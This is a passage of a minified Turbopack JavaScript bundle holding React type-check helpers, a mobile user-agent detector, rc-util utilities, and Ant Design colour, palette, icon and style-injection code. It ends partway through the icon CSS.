(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,64905,(e,t,r)=>{"use strict";var n,o=Symbol.for("react.element"),a=Symbol.for("react.portal"),i=Symbol.for("react.fragment"),s=Symbol.for("react.strict_mode"),l=Symbol.for("react.profiler"),c=Symbol.for("react.provider"),u=Symbol.for("react.context"),d=Symbol.for("react.server_context"),p=Symbol.for("react.forward_ref"),m=Symbol.for("react.suspense"),f=Symbol.for("react.suspense_list"),g=Symbol.for("react.memo"),h=Symbol.for("react.lazy"),b=Symbol.for("react.offscreen");function y(e){if("object"==typeof e&&null!==e){var t=e.$$typeof;switch(t){case o:switch(e=e.type){case i:case l:case s:case m:case f:return e;default:switch(e=e&&e.$$typeof){case d:case u:case p:case h:case g:case c:return e;default:return t}}case a:return t}}}n=Symbol.for("react.module.reference"),r.ContextConsumer=u,r.ContextProvider=c,r.Element=o,r.ForwardRef=p,r.Fragment=i,r.Lazy=h,r.Memo=g,r.Portal=a,r.Profiler=l,r.StrictMode=s,r.Suspense=m,r.SuspenseList=f,r.isAsyncMode=function(){return!1},r.isConcurrentMode=function(){return!1},r.isContextConsumer=function(e){return y(e)===u},r.isContextProvider=function(e){return y(e)===c},r.isElement=function(e){return"object"==typeof e&&null!==e&&e.$$typeof===o},r.isForwardRef=function(e){return y(e)===p},r.isFragment=function(e){return y(e)===i},r.isLazy=function(e){return y(e)===h},r.isMemo=function(e){return y(e)===g},r.isPortal=function(e){return y(e)===a},r.isProfiler=function(e){return y(e)===l},r.isStrictMode=function(e){return y(e)===s},r.isSuspense=function(e){return y(e)===m},r.isSuspenseList=function(e){return y(e)===f},r.isValidElementType=function(e){return"string"==typeof e||"function"==typeof e||e===i||e===l||e===s||e===m||e===f||e===b||"object"==typeof e&&null!==e&&(e.$$typeof===h||e.$$typeof===g||e.$$typeof===c||e.$$typeof===u||e.$$typeof===p||e.$$typeof===n||void 0!==e.getModuleId)||!1},r.typeOf=y},26339,(e,t,r)=>{"use strict";t.exports=e.r(64905)},6584,(e,t,r)=>{"use strict";t.exports=i,t.exports.isMobile=i,t.exports.default=i;let n=/(android|bb\d+|meego).+mobile|armv7l|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|redmi|series[46]0|samsungbrowser.*mobile|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i,o=/CrOS/,a=/android|ipad|playbook|silk/i;function i(e){e||(e={});let t=e.ua;if(!t&&"u">typeof navigator&&(t=navigator.userAgent),t&&t.headers&&"string"==typeof t.headers["user-agent"]&&(t=t.headers["user-agent"]),"string"!=typeof t)return!1;let r=n.test(t)&&!o.test(t)||!!e.tablet&&a.test(t);return!r&&e.tablet&&e.featureDetect&&navigator&&navigator.maxTouchPoints>1&&-1!==t.indexOf("Macintosh")&&-1!==t.indexOf("Safari")&&(r=!0),r}},72943,8211,32044,1676,40383,78749,32839,19261,24308,80573,67007,63335,51095,7670,42064,43081,35551,62370,96091,65846,27256,9583,1312,86612,18696,15584,15654,68297,96059,99615,78409,33848,83293,70517,17933,88317,10751,20890,45978,19581,46422,90224,11517,66365,17455,37434,80251,62139,92812,94758,38378,64517,67384,78052,87225,49468,28473,43022,42569,30294,49637,30731,28235,31067,60698,63611,65044,4079,50211,33578,13381,21883,13541,2366,64142,75712,e=>{"use strict";let t,r,n,o,a,i,s,l,c;function u(e,t){(null==t||t>e.length)&&(t=e.length);for(var r=0,n=Array(t);r<t;r++)n[r]=e[r];return n}function d(e,t){if(e){if("string"==typeof e)return u(e,t);var r=({}).toString.call(e).slice(8,-1);return"Object"===r&&e.constructor&&(r=e.constructor.name),"Map"===r||"Set"===r?Array.from(e):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?u(e,t):void 0}}function p(e){return function(e){if(Array.isArray(e))return u(e)}(e)||function(e){if("u">typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}(e)||d(e)||function(){throw TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}e.i(47167),e.s(["default",()=>p],8211);var m,f,g,h,b=e.i(71645);let y=function(e){let t=b.useRef(e);return t.current=e,b.useCallback((...e)=>t.current?.(...e),[])};function v(){return!!("u">typeof window&&window.document&&window.document.createElement)}e.s(["default",()=>v],32044);let S=v()?b.useLayoutEffect:b.useEffect,x=(e,t)=>{let r=b.useRef(!0);S(()=>e(r.current),t),S(()=>(r.current=!1,()=>{r.current=!0}),[])},C=(e,t)=>{x(t=>{if(!t)return e()},t)};function w(e,t){let[r,n]=(0,b.useState)(e),o=void 0!==t?t:r;return x(e=>{e||n(t)},[t]),[o,n]}e.s(["default",0,x,"useLayoutUpdateEffect",0,C],1676),e.s(["default",()=>w],40383);var k=e.i(26339);function $(e,t,r){let n=b.useRef({});return(!("value"in n.current)||r(n.current.condition,t))&&(n.current.value=e(),n.current.condition=t),n.current.value}e.s(["default",()=>$],78749);let E=Symbol.for("react.element"),P=Symbol.for("react.transitional.element"),T=Symbol.for("react.fragment");function I(e){return e&&"object"==typeof e&&(e.$$typeof===E||e.$$typeof===P)&&e.type===T}let M=Number(b.version.split(".")[0]),R=(...e)=>{let t=e.filter(Boolean);return t.length<=1?t[0]:t=>{e.forEach(e=>{"function"==typeof e?e(t):"object"==typeof e&&e&&"current"in e&&(e.current=t)})}},A=(...e)=>$(()=>R(...e),e,(e,t)=>e.length!==t.length||e.every((e,r)=>e!==t[r])),D=e=>{if(!e)return!1;if(L(e)&&M>=19)return!0;let t=(0,k.isMemo)(e)?e.type.type:e.type;return("function"!=typeof t||!!t.prototype?.render||t.$$typeof===k.ForwardRef)&&("function"!=typeof e||!!e.prototype?.render||e.$$typeof===k.ForwardRef)};function L(e){return(0,b.isValidElement)(e)&&!I(e)}let _=e=>e&&L(e)?e.props.propertyIsEnumerable("ref")?e.props.ref:e.ref:null;function O(e,t){let r=e;for(let e=0;e<t.length;e+=1){if(null==r)return;r=r[t[e]]}return r}function N(e,t,r,n=!1){return t.length&&n&&void 0===r&&!O(e,t.slice(0,-1))?e:function e(t,r,n,o){let a;if(!r.length)return n;let[i,...s]=r;return a=t||"number"!=typeof i?Array.isArray(t)?[...t]:{...t}:[],o&&void 0===n&&1===s.length?delete a[i][s[0]]:a[i]=e(a[i],s,n,o),a}(e,t,r,n)}function F(e){return Array.isArray(e)?[]:{}}e.s(["composeRef",0,R,"getNodeRef",0,_,"supportNodeRef",0,e=>L(e)&&D(e),"supportRef",0,D,"useComposeRef",0,A],32839);let j="u"<typeof Reflect?Object.keys:Reflect.ownKeys;function H(e,t={}){let{prepareArray:r}=t,n=r||(()=>[]),o=F(e[0]);return e.forEach(e=>{!function t(r,a){let i=new Set(a),s=O(e,r),l=Array.isArray(s);if(l||"object"==typeof s&&null!==s&&Object.getPrototypeOf(s)===Object.prototype){if(!i.has(s)){i.add(s);let e=O(o,r);l?o=N(o,r,n(e,s)):e&&"object"==typeof e||(o=N(o,r,F(s))),j(s).forEach(e=>{Object.getOwnPropertyDescriptor(s,e).enumerable&&t([...r,e],i)})}}else o=N(o,r,s)}([])}),o}function B(...e){return H(e)}e.s(["default",()=>N,"merge",()=>B,"mergeWith",()=>H],19261);let z={},V=[];function W(e,t){}function U(e,t){}function q(e,t,r){t||z[r]||(e(!1,r),z[r]=!0)}function G(e,t){q(W,e,t)}function J(e,t){let r=Object.assign({},e);return Array.isArray(t)&&t.forEach(e=>{delete r[e]}),r}function X(e,t={}){let r=[];return b.default.Children.forEach(e,e=>{(null!=e||t.keepEmpty)&&(Array.isArray(e)?r=r.concat(X(e)):I(e)&&e.props?r=r.concat(X(e.props.children,t)):r.push(e))}),r}function K(){for(var e,t,r=0,n="",o=arguments.length;r<o;r++)(e=arguments[r])&&(t=function e(t){var r,n,o="";if("string"==typeof t||"number"==typeof t)o+=t;else if("object"==typeof t)if(Array.isArray(t)){var a=t.length;for(r=0;r<a;r++)t[r]&&(n=e(t[r]))&&(o&&(o+=" "),o+=n)}else for(n in t)t[n]&&(o&&(o+=" "),o+=n);return o}(e))&&(n&&(n+=" "),n+=t);return n}G.preMessage=e=>{V.push(e)},G.resetWarned=function(){z={}},G.noteOnce=function(e,t){q(U,e,t)},e.s(["default",0,G,"warning",()=>W,"warningOnce",()=>G],24308),e.s(["default",()=>J],80573),e.s(["default",()=>X],67007),e.s([],63335),e.s(["omit",()=>J],51095),e.s(["clsx",()=>K,"default",0,K],7670);let Q="ant",Y="anticon",Z=["outlined","borderless","filled","underlined"],ee=b.createContext({getPrefixCls:(e,t)=>t||(e?`${Q}-${e}`:Q),iconPrefixCls:Y}),{Consumer:et}=ee,er={};function en(e){let t=b.useContext(ee),{getPrefixCls:r,direction:n,getPopupContainer:o,renderEmpty:a}=t;return{classNames:er,styles:er,...t[e],getPrefixCls:r,direction:n,getPopupContainer:o,renderEmpty:a}}e.s(["ConfigConsumer",0,et,"ConfigContext",0,ee,"Variants",0,Z,"defaultIconPrefixCls",0,Y,"defaultPrefixCls",0,Q,"useComponentConfig",()=>en],42064);let eo=b.createContext({siderHook:{addSider:()=>null,removeSider:()=>null}});e.s(["toArray",()=>X],43081);let ea={icon:{tag:"svg",attrs:{viewBox:"0 0 1024 1024",focusable:"false"},children:[{tag:"path",attrs:{d:"M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 10112 0 56 56 0 10-112 0zm0 284a56 56 0 10112 0 56 56 0 10-112 0zm0 284a56 56 0 10112 0 56 56 0 10-112 0z"}}]},name:"bars",theme:"outlined"},ei={aliceblue:"9ehhb",antiquewhite:"9sgk7",aqua:"1ekf",aquamarine:"4zsno",azure:"9eiv3",beige:"9lhp8",bisque:"9zg04",black:"0",blanchedalmond:"9zhe5",blue:"73",blueviolet:"5e31e",brown:"6g016",burlywood:"8ouiv",cadetblue:"3qba8",chartreuse:"4zshs",chocolate:"87k0u",coral:"9yvyo",cornflowerblue:"3xael",cornsilk:"9zjz0",crimson:"8l4xo",cyan:"1ekf",darkblue:"3v",darkcyan:"rkb",darkgoldenrod:"776yz",darkgray:"6mbhl",darkgreen:"jr4",darkgrey:"6mbhl",darkkhaki:"7ehkb",darkmagenta:"5f91n",darkolivegreen:"3bzfz",darkorange:"9yygw",darkorchid:"5z6x8",darkred:"5f8xs",darksalmon:"9441m",darkseagreen:"5lwgf",darkslateblue:"2th1n",darkslategray:"1ugcv",darkslategrey:"1ugcv",darkturquoise:"14up",darkviolet:"5rw7n",deeppink:"9yavn",deepskyblue:"11xb",dimgray:"442g9",dimgrey:"442g9",dodgerblue:"16xof",firebrick:"6y7tu",floralwhite:"9zkds",forestgreen:"1cisi",fuchsia:"9y70f",gainsboro:"8m8kc",ghostwhite:"9pq0v",goldenrod:"8j4f4",gold:"9zda8",gray:"50i2o",green:"pa8",greenyellow:"6senj",grey:"50i2o",honeydew:"9eiuo",hotpink:"9yrp0",indianred:"80gnw",indigo:"2xcoy",ivory:"9zldc",khaki:"9edu4",lavenderblush:"9ziet",lavender:"90c8q",lawngreen:"4vk74",lemonchiffon:"9zkct",lightblue:"6s73a",lightcoral:"9dtog",lightcyan:"8s1rz",lightgoldenrodyellow:"9sjiq",lightgray:"89jo3",lightgreen:"5nkwg",lightgrey:"89jo3",lightpink:"9z6wx",lightsalmon:"9z2ii",lightseagreen:"19xgq",lightskyblue:"5arju",lightslategray:"4nwk9",lightslategrey:"4nwk9",lightsteelblue:"6wau6",lightyellow:"9zlcw",lime:"1edc",limegreen:"1zcxe",linen:"9shk6",magenta:"9y70f",maroon:"4zsow",mediumaquamarine:"40eju",mediumblue:"5p",mediumorchid:"79qkz",mediumpurple:"5r3rv",mediumseagreen:"2d9ip",mediumslateblue:"4tcku",mediumspringgreen:"1di2",mediumturquoise:"2uabw",mediumvioletred:"7rn9h",midnightblue:"z980",mintcream:"9ljp6",mistyrose:"9zg0x",moccasin:"9zfzp",navajowhite:"9zest",navy:"3k",oldlace:"9wq92",olive:"50hz4",olivedrab:"472ub",orange:"9z3eo",orangered:"9ykg0",orchid:"8iu3a",palegoldenrod:"9bl4a",palegreen:"5yw0o",paleturquoise:"6v4ku",palevioletred:"8k8lv",papayawhip:"9zi6t",peachpuff:"9ze0p",peru:"80oqn",pink:"9z8wb",plum:"8nba5",powderblue:"6wgdi",purple:"4zssg",rebeccapurple:"3zk49",red:"9y6tc",rosybrown:"7cv4f",royalblue:"2jvtt",saddlebrown:"5fmkz",salmon:"9rvci",sandybrown:"9jn1c",seagreen:"1tdnb",seashell:"9zje6",sienna:"6973h",silver:"7ir40",skyblue:"5arjf",slateblue:"45e4t",slategray:"4e100",slategrey:"4e100",snow:"9zke2",springgreen:"1egv",steelblue:"2r1kk",tan:"87yx8",teal:"pds",thistle:"8ggk8",tomato:"9yqfb",turquoise:"2j4r4",violet:"9b10u",wheat:"9ld4j",white:"9zldr",whitesmoke:"9lhpx",yellow:"9zl6o",yellowgreen:"61fzm"},es=Math.round;function el(e,t){let r=e.replace(/^[^(]*\((.*)/,"$1").replace(/\).*/,"").match(/\d*\.?\d+%?/g)||[],n=r.map(e=>parseFloat(e));for(let e=0;e<3;e+=1)n[e]=t(n[e]||0,r[e]||"",e);return r[3]?n[3]=r[3].includes("%")?n[3]/100:n[3]:n[3]=1,n}let ec=(e,t,r)=>0===r?e:e/100;function eu(e,t){let r=t||255;return e>r?r:e<0?0:e}class ed{isValid=!0;r=0;g=0;b=0;a=1;_h;_hsl_s;_hsv_s;_l;_v;_max;_min;_brightness;constructor(e){function t(t){return t[0]in e&&t[1]in e&&t[2]in e}if(e)if("string"==typeof e){const t=e.trim();function r(e){return t.startsWith(e)}if(/^#?[A-F\d]{3,8}$/i.test(t))this.fromHexString(t);else if(r("rgb"))this.fromRgbString(t);else if(r("hsl"))this.fromHslString(t);else if(r("hsv")||r("hsb"))this.fromHsvString(t);else{const e=ei[t.toLowerCase()];e&&this.fromHexString(parseInt(e,36).toString(16).padStart(6,"0"))}}else if(e instanceof ed)this.r=e.r,this.g=e.g,this.b=e.b,this.a=e.a,this._h=e._h,this._hsl_s=e._hsl_s,this._hsv_s=e._hsv_s,this._l=e._l,this._v=e._v;else if(t("rgb"))this.r=eu(e.r),this.g=eu(e.g),this.b=eu(e.b),this.a="number"==typeof e.a?eu(e.a,1):1;else if(t("hsl"))this.fromHsl(e);else if(t("hsv"))this.fromHsv(e);else throw Error("@ant-design/fast-color: unsupported input "+JSON.stringify(e))}setR(e){return this._sc("r",e)}setG(e){return this._sc("g",e)}setB(e){return this._sc("b",e)}setA(e){return this._sc("a",e,1)}setHue(e){let t=this.toHsv();return t.h=e,this._c(t)}getLuminance(){function e(e){let t=e/255;return t<=.03928?t/12.92:Math.pow((t+.055)/1.055,2.4)}return .2126*e(this.r)+.7152*e(this.g)+.0722*e(this.b)}getHue(){if(void 0===this._h){let e=this.getMax()-this.getMin();0===e?this._h=0:this._h=es(60*(this.r===this.getMax()?(this.g-this.b)/e+6*(this.g<this.b):this.g===this.getMax()?(this.b-this.r)/e+2:(this.r-this.g)/e+4))}return this._h}getSaturation(){return this.getHSVSaturation()}getHSVSaturation(){if(void 0===this._hsv_s){let e=this.getMax()-this.getMin();0===e?this._hsv_s=0:this._hsv_s=e/this.getMax()}return this._hsv_s}getHSLSaturation(){if(void 0===this._hsl_s){let e=this.getMax()-this.getMin();if(0===e)this._hsl_s=0;else{let t=this.getLightness();this._hsl_s=e/255/(1-Math.abs(2*t-1))}}return this._hsl_s}getLightness(){return void 0===this._l&&(this._l=(this.getMax()+this.getMin())/510),this._l}getValue(){return void 0===this._v&&(this._v=this.getMax()/255),this._v}getBrightness(){return void 0===this._brightness&&(this._brightness=(299*this.r+587*this.g+114*this.b)/1e3),this._brightness}darken(e=10){let t=this.getHue(),r=this.getSaturation(),n=this.getLightness()-e/100;return n<0&&(n=0),this._c({h:t,s:r,l:n,a:this.a})}lighten(e=10){let t=this.getHue(),r=this.getSaturation(),n=this.getLightness()+e/100;return n>1&&(n=1),this._c({h:t,s:r,l:n,a:this.a})}mix(e,t=50){let r=this._c(e),n=t/100,o=e=>(r[e]-this[e])*n+this[e],a={r:es(o("r")),g:es(o("g")),b:es(o("b")),a:es(100*o("a"))/100};return this._c(a)}tint(e=10){return this.mix({r:255,g:255,b:255,a:1},e)}shade(e=10){return this.mix({r:0,g:0,b:0,a:1},e)}onBackground(e){let t=this._c(e),r=this.a+t.a*(1-this.a),n=e=>es((this[e]*this.a+t[e]*t.a*(1-this.a))/r);return this._c({r:n("r"),g:n("g"),b:n("b"),a:r})}isDark(){return 128>this.getBrightness()}isLight(){return this.getBrightness()>=128}equals(e){return this.r===e.r&&this.g===e.g&&this.b===e.b&&this.a===e.a}clone(){return this._c(this)}toHexString(){let e="#",t=(this.r||0).toString(16);e+=2===t.length?t:"0"+t;let r=(this.g||0).toString(16);e+=2===r.length?r:"0"+r;let n=(this.b||0).toString(16);if(e+=2===n.length?n:"0"+n,"number"==typeof this.a&&this.a>=0&&this.a<1){let t=es(255*this.a).toString(16);e+=2===t.length?t:"0"+t}return e}toHsl(){return{h:this.getHue(),s:this.getHSLSaturation(),l:this.getLightness(),a:this.a}}toHslString(){let e=this.getHue(),t=es(100*this.getHSLSaturation()),r=es(100*this.getLightness());return 1!==this.a?`hsla(${e},${t}%,${r}%,${this.a})`:`hsl(${e},${t}%,${r}%)`}toHsv(){return{h:this.getHue(),s:this.getHSVSaturation(),v:this.getValue(),a:this.a}}toRgb(){return{r:this.r,g:this.g,b:this.b,a:this.a}}toRgbString(){return 1!==this.a?`rgba(${this.r},${this.g},${this.b},${this.a})`:`rgb(${this.r},${this.g},${this.b})`}toString(){return this.toRgbString()}_sc(e,t,r){let n=this.clone();return n[e]=eu(t,r),n}_c(e){return new this.constructor(e)}getMax(){return void 0===this._max&&(this._max=Math.max(this.r,this.g,this.b)),this._max}getMin(){return void 0===this._min&&(this._min=Math.min(this.r,this.g,this.b)),this._min}fromHexString(e){let t=e.replace("#","");function r(e,r){return parseInt(t[e]+t[r||e],16)}t.length<6?(this.r=r(0),this.g=r(1),this.b=r(2),this.a=t[3]?r(3)/255:1):(this.r=r(0,1),this.g=r(2,3),this.b=r(4,5),this.a=t[6]?r(6,7)/255:1)}fromHsl({h:e,s:t,l:r,a:n}){let o=(e%360+360)%360;if(this._h=o,this._hsl_s=t,this._l=r,this.a="number"==typeof n?n:1,t<=0){let e=es(255*r);this.r=e,this.g=e,this.b=e;return}let a=0,i=0,s=0,l=o/60,c=(1-Math.abs(2*r-1))*t,u=c*(1-Math.abs(l%2-1));l>=0&&l<1?(a=c,i=u):l>=1&&l<2?(a=u,i=c):l>=2&&l<3?(i=c,s=u):l>=3&&l<4?(i=u,s=c):l>=4&&l<5?(a=u,s=c):l>=5&&l<6&&(a=c,s=u);let d=r-c/2;this.r=es((a+d)*255),this.g=es((i+d)*255),this.b=es((s+d)*255)}fromHsv({h:e,s:t,v:r,a:n}){let o=(e%360+360)%360;this._h=o,this._hsv_s=t,this._v=r,this.a="number"==typeof n?n:1;let a=es(255*r);if(this.r=a,this.g=a,this.b=a,t<=0)return;let i=o/60,s=Math.floor(i),l=i-s,c=es(r*(1-t)*255),u=es(r*(1-t*l)*255),d=es(r*(1-t*(1-l))*255);switch(s){case 0:this.g=d,this.b=c;break;case 1:this.r=u,this.b=c;break;case 2:this.r=c,this.b=d;break;case 3:this.r=c,this.g=u;break;case 4:this.r=d,this.g=c;break;default:this.g=c,this.b=u}}fromHsvString(e){let t=el(e,ec);this.fromHsv({h:t[0],s:t[1],v:t[2],a:t[3]})}fromHslString(e){let t=el(e,ec);this.fromHsl({h:t[0],s:t[1],l:t[2],a:t[3]})}fromRgbString(e){let t=el(e,(e,t)=>t.includes("%")?es(e/100*255):e);this.r=t[0],this.g=t[1],this.b=t[2],this.a=t[3]}}e.s(["FastColor",()=>ed],35551),e.s([],62370);let ep=[{index:7,amount:15},{index:6,amount:25},{index:5,amount:30},{index:5,amount:45},{index:5,amount:65},{index:5,amount:85},{index:4,amount:90},{index:3,amount:95},{index:2,amount:97},{index:1,amount:98}];function em(e,t,r){let n;return(n=Math.round(e.h)>=60&&240>=Math.round(e.h)?r?Math.round(e.h)-2*t:Math.round(e.h)+2*t:r?Math.round(e.h)+2*t:Math.round(e.h)-2*t)<0?n+=360:n>=360&&(n-=360),n}function ef(e,t,r){let n;return 0===e.h&&0===e.s?e.s:((n=r?e.s-.16*t:4===t?e.s+.16:e.s+.05*t)>1&&(n=1),r&&5===t&&n>.1&&(n=.1),n<.06&&(n=.06),Math.round(100*n)/100)}function eg(e,t,r){return Math.round(100*Math.max(0,Math.min(1,r?e.v+.05*t:e.v-.15*t)))/100}function eh(e,t={}){let r=[],n=new ed(e),o=n.toHsv();for(let e=5;e>0;e-=1){let t=new ed({h:em(o,e,!0),s:ef(o,e,!0),v:eg(o,e,!0)});r.push(t)}r.push(n);for(let e=1;e<=4;e+=1){let t=new ed({h:em(o,e),s:ef(o,e),v:eg(o,e)});r.push(t)}return"dark"===t.theme?ep.map(({index:e,amount:n})=>new ed(t.backgroundColor||"#141414").mix(r[e],n).toHexString()):r.map(e=>e.toHexString())}let eb={red:"#F5222D",volcano:"#FA541C",orange:"#FA8C16",gold:"#FAAD14",yellow:"#FADB14",lime:"#A0D911",green:"#52C41A",cyan:"#13C2C2",blue:"#1677FF",geekblue:"#2F54EB",purple:"#722ED1",magenta:"#EB2F96",grey:"#666666"},ey=["#fff1f0","#ffccc7","#ffa39e","#ff7875","#ff4d4f","#f5222d","#cf1322","#a8071a","#820014","#5c0011"];ey.primary=ey[5];let ev=["#fff2e8","#ffd8bf","#ffbb96","#ff9c6e","#ff7a45","#fa541c","#d4380d","#ad2102","#871400","#610b00"];ev.primary=ev[5];let eS=["#fff7e6","#ffe7ba","#ffd591","#ffc069","#ffa940","#fa8c16","#d46b08","#ad4e00","#873800","#612500"];eS.primary=eS[5];let ex=["#fffbe6","#fff1b8","#ffe58f","#ffd666","#ffc53d","#faad14","#d48806","#ad6800","#874d00","#613400"];ex.primary=ex[5];let eC=["#feffe6","#ffffb8","#fffb8f","#fff566","#ffec3d","#fadb14","#d4b106","#ad8b00","#876800","#614700"];eC.primary=eC[5];let ew=["#fcffe6","#f4ffb8","#eaff8f","#d3f261","#bae637","#a0d911","#7cb305","#5b8c00","#3f6600","#254000"];ew.primary=ew[5];let ek=["#f6ffed","#d9f7be","#b7eb8f","#95de64","#73d13d","#52c41a","#389e0d","#237804","#135200","#092b00"];ek.primary=ek[5];let e$=["#e6fffb","#b5f5ec","#87e8de","#5cdbd3","#36cfc9","#13c2c2","#08979c","#006d75","#00474f","#002329"];e$.primary=e$[5];let eE=["#e6f4ff","#bae0ff","#91caff","#69b1ff","#4096ff","#1677ff","#0958d9","#003eb3","#002c8c","#001d66"];eE.primary=eE[5];let eP=["#f0f5ff","#d6e4ff","#adc6ff","#85a5ff","#597ef7","#2f54eb","#1d39c4","#10239e","#061178","#030852"];eP.primary=eP[5];let eT=["#f9f0ff","#efdbff","#d3adf7","#b37feb","#9254de","#722ed1","#531dab","#391085","#22075e","#120338"];eT.primary=eT[5];let eI=["#fff0f6","#ffd6e7","#ffadd2","#ff85c0","#f759ab","#eb2f96","#c41d7f","#9e1068","#780650","#520339"];eI.primary=eI[5];let eM=["#a6a6a6","#999999","#8c8c8c","#808080","#737373","#666666","#404040","#1a1a1a","#000000","#000000"];eM.primary=eM[5];let eR={red:ey,volcano:ev,orange:eS,gold:ex,yellow:eC,lime:ew,green:ek,cyan:e$,blue:eE,geekblue:eP,purple:eT,magenta:eI,grey:eM},eA=["#2a1215","#431418","#58181c","#791a1f","#a61d24","#d32029","#e84749","#f37370","#f89f9a","#fac8c3"];eA.primary=eA[5];let eD=["#2b1611","#441d12","#592716","#7c3118","#aa3e19","#d84a1b","#e87040","#f3956a","#f8b692","#fad4bc"];eD.primary=eD[5];let eL=["#2b1d11","#442a11","#593815","#7c4a15","#aa6215","#d87a16","#e89a3c","#f3b765","#f8cf8d","#fae3b7"];eL.primary=eL[5];let e_=["#2b2111","#443111","#594214","#7c5914","#aa7714","#d89614","#e8b339","#f3cc62","#f8df8b","#faedb5"];e_.primary=e_[5];let eO=["#2b2611","#443b11","#595014","#7c6e14","#aa9514","#d8bd14","#e8d639","#f3ea62","#f8f48b","#fafab5"];eO.primary=eO[5];let eN=["#1f2611","#2e3c10","#3e4f13","#536d13","#6f9412","#8bbb11","#a9d134","#c9e75d","#e4f88b","#f0fab5"];eN.primary=eN[5];let eF=["#162312","#1d3712","#274916","#306317","#3c8618","#49aa19","#6abe39","#8fd460","#b2e58b","#d5f2bb"];eF.primary=eF[5];let ej=["#112123","#113536","#144848","#146262","#138585","#13a8a8","#33bcb7","#58d1c9","#84e2d8","#b2f1e8"];ej.primary=ej[5];let eH=["#111a2c","#112545","#15325b","#15417e","#1554ad","#1668dc","#3c89e8","#65a9f3","#8dc5f8","#b7dcfa"];eH.primary=eH[5];let eB=["#131629","#161d40","#1c2755","#203175","#263ea0","#2b4acb","#5273e0","#7f9ef3","#a8c1f8","#d2e0fa"];eB.primary=eB[5];let ez=["#1a1325","#24163a","#301c4d","#3e2069","#51258f","#642ab5","#854eca","#ab7ae0","#cda8f0","#ebd7fa"];ez.primary=ez[5];let eV=["#291321","#40162f","#551c3b","#75204f","#a02669","#cb2b83","#e0529c","#f37fb7","#f8a8cc","#fad2e3"];eV.primary=eV[5];let eW=["#151515","#1f1f1f","#2d2d2d","#393939","#494949","#5a5a5a","#6a6a6a","#7b7b7b","#888888","#969696"];eW.primary=eW[5],e.s(["blue",0,eE,"gold",0,ex,"presetPalettes",0,eR,"presetPrimaryColors",0,eb],96091),e.s([],65846);let eU=(0,b.createContext)({});e.s(["default",0,eU],27256);let eq="data-rc-order",eG="data-rc-priority",eJ=new Map;function eX({mark:e}={}){return e?e.startsWith("data-")?e:`data-${e}`:"rc-util-key"}function eK(e){return e.attachTo?e.attachTo:document.querySelector("head")||document.body}function eQ(e){return Array.from((eJ.get(e)||e).children).filter(e=>"STYLE"===e.tagName)}function eY(e,t={}){if(!v())return null;let{csp:r,prepend:n,priority:o=0}=t,a="queue"===n?"prependQueue":n?"prepend":"append",i="prependQueue"===a,s=document.createElement("style");s.setAttribute(eq,a),i&&o&&s.setAttribute(eG,`${o}`),r?.nonce&&(s.nonce=r?.nonce),s.innerHTML=e;let l=eK(t),{firstChild:c}=l;if(n){if(i){let e=(t.styles||eQ(l)).filter(e=>!!["prepend","prependQueue"].includes(e.getAttribute(eq))&&o>=Number(e.getAttribute(eG)||0));if(e.length)return l.insertBefore(s,e[e.length-1].nextSibling),s}l.insertBefore(s,c)}else l.appendChild(s);return s}function eZ(e,t={}){let{styles:r}=t;return(r||=eQ(eK(t))).find(r=>r.getAttribute(eX(t))===e)}function e0(e,t={}){let r=eZ(e,t);r&&eK(t).removeChild(r)}function e1(e,t,r={}){let n=eK(r),o=eQ(n),a={...r,styles:o};!function(e,t){let r=eJ.get(e);if(!r||!function(e,t){if(!e)return!1;if(e.contains)return e.contains(t);let r=t;for(;r;){if(r===e)return!0;r=r.parentNode}return!1}(document,r)){let r=eY("",t),{parentNode:n}=r;eJ.set(e,n),e.removeChild(r)}}(n,a);let i=eZ(t,a);if(i)return a.csp?.nonce&&i.nonce!==a.csp?.nonce&&(i.nonce=a.csp?.nonce),i.innerHTML!==e&&(i.innerHTML=e),i;let s=eY(e,a);return s.setAttribute(eX(a),t),s}function e2(e){return e?.getRootNode?.()}function e3(e){return e2(e)instanceof ShadowRoot?e2(e):null}function e6(e){return"object"==typeof e&&"string"==typeof e.name&&"string"==typeof e.theme&&("object"==typeof e.icon||"function"==typeof e.icon)}function e4(e={}){return Object.keys(e).reduce((t,r)=>{let n=e[r];return"class"===r?(t.className=n,delete t.class):(delete t[r],t[r.replace(/-(.)/g,(e,t)=>t.toUpperCase())]=n),t},{})}function e5(e){return e?Array.isArray(e)?e:[e]:[]}let e8=`
.anticon {
  display: inline-flex;
  align-items: center;
  color: inherit;
  font-style: normal;
  line-height: 0;
  text-align: center;
  text-transform: none;
  vertical-align: -0.125em;
  text-rendering: optimizeLegibility;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.anticon > * {
  line-height: 1;
}

.anticon svg {
  display: inline-block;
  vertical-align: inherit;
}

.anticon::before {
  display: none;
}

.anticon .anticon-icon {
  display: block;
}

.anticon[tabindex] {
  cursor: pointer;
}

.anticon-spin::before,
.anticon-spin {
  display: inline-block;
  -webkit-animation: loadingCircle 1s infinite linear;
  animation: loadingCircle 1s infinite linear;
}

@-webkit-keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}

@keyframes loadingCircle {
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
